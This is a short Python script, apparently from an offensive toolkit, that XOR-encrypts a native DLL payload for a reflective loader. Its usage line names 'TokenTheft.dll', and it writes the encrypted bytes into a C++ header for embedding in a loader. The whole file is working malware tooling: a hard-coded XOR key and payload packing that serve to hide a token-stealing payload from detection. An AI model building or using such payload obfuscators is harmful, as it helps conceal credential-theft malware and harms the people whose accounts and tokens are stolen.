#!/usr/bin/env python3
"""
Payload Encryptor for Reflective Loader
Usage: python encrypt_payload.py TokenTheft.dll encrypted.bin
"""

import sys
import os

XOR_KEY = bytes([0x7A, 0x3C, 0x9E, 0x1F, 0x4D, 0x2B, 0x88, 0xC6])

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
    return bytes(result)

def main():
    if len(sys.argv) < 2:
        print("Usage: python encrypt_payload.py <input.dll> [output.bin]")
        print("  input.dll  - Native AOT DLL to encrypt")
        print("  output.bin - Encrypted output file (optional)")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file.replace('.dll', '.enc')
    
    if not os.path.exists(input_file):
        print(f"[-] File not found: {input_file}")
        sys.exit(1)
    
    print(f"[*] Reading: {input_file}")
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    
    print(f"[*] Size: {len(plaintext)} bytes")
    print(f"[*] Encrypting with XOR key: {XOR_KEY.hex()}")
    
    encrypted = xor_encrypt(plaintext, XOR_KEY)
    
    print(f"[*] Writing: {output_file}")
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    
    print(f"[+] Done! Encrypted size: {len(encrypted)} bytes")
    
    # Generate C++ header for embedding
    cpp_header = output_file.replace('.bin', '.h')
    with open(cpp_header, 'w') as f:
        f.write("// Auto-generated encrypted payload\n")
        f.write("static const BYTE g_EncryptedPayload[] = {\n    ")
        for i, b in enumerate(encrypted):
            if i > 0 and i % 16 == 0:
                f.write("\n    ")
            f.write(f"0x{b:02X}, ")
        f.write("\n};\n")
        f.write(f"static const DWORD g_EncryptedPayloadSize = {len(encrypted)};\n")
    
    print(f"[+] C++ header: {cpp_header}")

if __name__ == "__main__":
    main()